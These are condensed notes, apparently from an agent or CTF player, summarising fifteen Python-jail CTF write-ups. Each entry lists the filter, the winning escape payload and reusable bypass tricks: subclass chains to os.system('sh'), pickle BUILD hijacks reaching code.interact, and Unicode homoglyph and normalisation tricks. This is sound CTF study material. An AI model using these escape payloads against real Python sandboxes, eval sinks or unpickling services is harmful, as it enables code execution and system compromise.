# R5 deep reads — pyjail (15 complete articles, browser-read 2026-10-17)

## 1. pyjail index cheatsheet
- READ: Filter-overview page; winning shape `().__class__.__base__.__subclasses__()[os_idx].__init__.__globals__["system"]("sh")` + variants.
- CHAIN: Bypass primitives enumerated then mapped per chal: `__getitem__` for `[]`, `().__doc__[i]` for strings, `-~x` for +1, `[a:=1]`/`[[]for[a]in[[b]]]` for `=`-less assign, decorator `@exec/@input` for paren-less call.
- GOTCHA: Direct `__import__`/`eval` fails under `{'__builtins__':{}}`; via `__subclasses__→__globals__/__builtins__` or `__reduce_ex__(2)[0]` indirection.
- REUSE: Fingerprint subclass index per Python version before fixing index.

## 2. jailCTF Quasar Files
- READ: `assert '['/']'/'"'/"'" not in f` + `exec(f,{'__builtins__':{}})`; winning shape via `__getitem__(167)` + `().__doc__.__getitem__` char spelling.
- CHAIN: `[]`→`__getitem__`, strings→`().__doc__.__getitem__(19/86/4/17/10/56)` spelling `system`/`sh`; `os._wrap_close`=167 → globals `system("sh")`.
- GOTCHA: `"system"`/`'sh'` literals trigger filter; `__doc__` char extraction + `__getitem__` attribute call instead.
- REUSE: Quotes+brackets banned → build all strings from `__doc__`/help strings via indexed `__getitem__`.

## 3. jailCTF Collatz
- READ: `len(code)<400` + every `\w+` length must equal Collatz seq from start; winning 388-char chain from start 9 ending `check_call('rbash')`.
- CHAIN: Chain 9→28→14→7→22→11→34→17→52→26→13→40→20→10→5 across dunders; pad with `"__builtins__000…"[:0x…]` + `[v][000…]` no-ops; numbers via `(()==())/-~`.
- GOTCHA: `__globals__["builtins"]` literal + `code.interact()` tail fail length chain; padded slices + early `check_call('rbash')` stop.
- REUSE: Length-constrained `\w+` jails: pad strings `"s000…"[:0x…]`, words `[v][000…]`.

## 4. SECCON Final Increasing
- READ: First 130 chars ascii + each `\w+` strictly increasing length + `eval(code,{"__builtins__":{}})`; winning shape via `().__setattr__.__objclass__.__subclasses__()[0x…aa]()` + short call.
- CHAIN: `__class__/__base__/__mro__` too short → `__setattr__.__objclass__` stem; grow via `0x00000000123` hex + `"sh000…"[:2]`; helper=170 `help()`→`pdb`→`Popen(['sh'])`=344.
- GOTCHA: Normal chain breaks increasing order; longer stem + zero-padded literals instead.
- REUSE: Increasing-length jails: inflate with `0x000…123` and `"s000…"[:N]`, N=`([]==[])+([]==[])`.

## 5. hxp Sponsored (single-count chars)
- READ: `all(code.count(c)<=1 for c in ".,(+)")` + no-builtins eval; winning shape = list-comprehension state machine over steps a–w.
- CHAIN: `a.b`→split `ex[0].__getattribute__` + `ex[0](*ex[1:])`; stage list ops over steps to build full `_wrap_close` chain.
- GOTCHA: Multi-arg `__getattribute__(obj,"…")` impossible in one step; list doubling + two-phase get/call with walrus `ex`.
- REUSE: ≤1-count char jails: comprehension state machine + `__getattribute__` split into getter+caller phases.

## 6. TSG SafePickle (BUILD-only)
- READ: Bans `EXT1/EXT2/EXT4/REDUCE/INST/OBJ/PERSID/BINPERSID`; winning shape `GLOBAL license + GLOBAL code.interact + …BUILD POP` then `print(license)`.
- CHAIN: No call opcodes → `BUILD` sets `license._Printer__setup=code.interact`; returning license triggers `interact()` on print.
- GOTCHA: `REDUCE`/`INST` RCE blocked; `BUILD` attribute-write on existing object instead.
- REUSE: REDUCE banned + BUILD allowed → overwrite method attr on memoised builtin object.

## 7. HKCERT easyJail (pop_mark hijack)
- READ: Pops `NEWOBJ_EX/INST/REDUCE/OBJ/NEWOBJ` + nops handlers + substring blacklist; winning shape `GLOBAL _Unpickler + GLOBAL interact + BUILD pop_mark + TUPLE`.
- CHAIN: `BUILD` sets `Unpickler.pop_mark=code.interact`; trailing `TUPLE` invokes `pop_mark()` during unpickle → shell.
- GOTCHA: Direct os strings + REDUCE/NEWOBJ blocked; hijack unpickler method + `TUPLE`-triggered call, no banned strings.
- REUSE: Call opcodes neutered → `BUILD` a method on `pickle._Unpickler` itself, trigger with normal opcode.

## 8. SECCON excepython (exception stash)
- READ: Loop saves exception to `ex`; `all(code.count(c)<=1 for c in ".,(+)")`; winning shape `{}[f:=lambda…]` then `{}[g:=ex.args,…]` ×8 to `g[1]("sh")`.
- CHAIN: `{}[obj]`→`KeyError(obj,)` in `ex.args`; `lambda x:x[0].__getattribute__(*x[1:])` replaces dots; walk full chain one dot per line.
- GOTCHA: `__reduce_ex__` chain fails remotely (no `__import__` in eval); `_wrap_close.__globals__["system"]` chain + two-lambda helper instead.
- REUSE: Persistent `ex` across inputs → `{}[payload]` KeyError stash, rebuild dotted chains one dot per request.

## 9. hack.lu FANGELSE (5-char)
- READ: `len(code)>5` reject + `exec`, `flagbuf` + `len(flagbuf)^0x1337` side channel; winning shape `a=eⅺt` (U+217A) → `len=a` → `exit(flagbuf)`.
- CHAIN: 5-char limit blocks `a=exit` (6) → `ⅺ` lookalike aliases exit → rebind `len` → `exit(flagbuf)` leaks via exception print.
- GOTCHA: Plain alias rejected; Unicode-homoglyph names + clobber the checker (`len`) itself.
- REUSE: Ultra-short (≤5) jails: alias builtins with homoglyphs, then clobber the checker.

## 10. jailCTF Impossible (charset jail)
- READ: `eval(''.join(c for c in input if c in "abcdefghijklmnopqrstuvwxyz:_.[]"))` — lowercase + `:_ .[]` only; winning nested-comprehension shapes.
- CHAIN: No `()` → `obj.__class__.__getitem__=func;obj[arg]` calls; `[[]for[a]in[[b]]]` assigns without spaces/`=`; `__getattr__` avoids quotes; nest to `__import__('os').system('sh')` or `eval(input(license))`.
- GOTCHA: `[[]for a in[b]]` needs spaces (stripped); compact `[[]for[a]in[[b]]]` form instead.
- REUSE: Charset jails: `__getattr__`/`__getitem__` dunder assignment + `for[x]in[[y]]` as call/assign primitives.

## 11. jailCTF One (single dot)
- READ: `assert input.count(".")!=1` (zero or ≥2, never exactly one) + no-builtins eval; winning walrus-chain with single reusable `G`.
- CHAIN: `G=lambda x,*y:x.__getattribute__(*y)` replaces all dots except the one in its definition; walrus-chain `__setattr__`→`__objclass__`→`__subclasses__()[os]`→`__init__`→`globals['system']('sh')`.
- GOTCHA: Normal chains need many dots; centralise dot in one lambda, reuse `G()` for all access.
- REUSE: N-dot limits: define `G` once, never use `.` again except inside G.

## 12. jailCTF Primal (prime lengths)
- READ: `len>200`/non-ascii/`"eta"` rejected + every `\w+` prime length + no-builtins eval; winning `__reduce_ex__` + hex-escape shape.
- CHAIN: No `eta` kills getattr → `obj[name]` subscript; builtins via `__reduce_ex__(2)[0].__globals__`; numbers from `'aa'.__len__()`=2, `False` 0-index, `\xXX` escapes for banned letters, `execl` (=5) over `system` (=6).
- GOTCHA: Literals `2`/`0`/`e` break rules; `'aa'.__len__()`, `False`, `\x5f\x62…` escapes instead.
- REUSE: Prime-length/char-ban jails: numbers from `'aa'.__len__()`, banned chars as `\xXX`.

## 13. CrewCTF pyfuck (alpha+plus only)
- READ: Whitelist `a-z()+`, `+` budget 12, len 340, `exec("print("+cmd+")")`; winning generator/set-assembly shapes.
- CHAIN: Ints from `len(str(…))/ord(min(…))/max(range(…))`; chars via `chr(…)/min/max(str(…))`; assemble `open(Flag.txt)` within budget; pair lines with `range(38)`/stdin via generator + outer `set()` for order/dups.
- GOTCHA: Direct strings/prints need banned chars/quotes/`+` budget; synthesised `chr()` sums + generator-held file handle + set-dedup bypass.
- REUSE: Alpha+`()+`: bootstrap numbers from len/ord/max of builtin reprs, then `chr(a+b+…)` within budget.

## 14. WHY TitleCase (Unicode fold)
- READ: `eval(input().title())` (real bug: `eval(api_response["some_field"].title())`); winning `𝐛𝐫𝐞𝐚𝐤𝐩𝐨𝐢𝐧𝐭()` (U+1D41A block) → `breakpoint()` → pdb → shell.
- CHAIN: `.title()` uppercases ASCII after boundaries; encode alpha as Mathematical Alphanumeric (`+0x1D41A`) which `title()` leaves alone but Python normalises → `breakpoint()`.
- GOTCHA: Plain `breakpoint()` → `Breakpoint()` NameError; NFKC-foldable block survives `.title()` unchanged.
- REUSE: `.title()/.lower()/.upper()` sanitisers: remap `a-z` to U+1D400 block to preserve identifier semantics.

## 15. LACTF Farquaad (no-e)
- READ: Printable-only + `e`/`E` rejected + no-builtins eval; winning `__dict__`-index + `startswith`/`in` search shapes to `InteractiveConsole().interact()`.
- CHAIN: No `e` → `list(dict)[idx]` + `x.__dict__[key](args)` indirection + `startswith('modul'/'cod')`/`in 'Consol'/'ract'` searches; `help()`→`code` module→`sys.modules["code"].InteractiveConsole().interact()`; alt `\x65` for `e`.
- GOTCHA: `__subclasses__`/`system` contain `e`; dict-index lookup + substring search avoiding `e`, or `\x65` escapes (not literal `e`).
- REUSE: Single-letter bans: fetch via `list(obj.__dict__)[i]` + `__dict__[key]`, or `\x65`-style hex escapes.
